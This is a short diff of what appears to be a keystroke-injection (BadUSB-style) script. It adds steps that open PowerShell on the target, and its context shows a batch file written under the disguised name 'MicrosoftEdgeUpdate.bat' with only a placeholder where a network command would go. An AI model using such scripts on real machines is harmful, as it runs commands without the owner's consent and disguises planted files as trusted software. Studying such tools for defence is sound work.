@@ -141,6 +141,10 @@ Q DELAY 400
 Q STRING cd H:\Desktop
 Q ENTER
 Q DELAY 200
+Q STRING powershell
+Q DELAY 600
+Q ENTER
+Q DELAY 600
 Q STRING Set-Content -Path 'MicrosoftEdgeUpdate.bat' -Value "This could be a POST or SSH command"
 Q ENTER
 Q DELAY 200
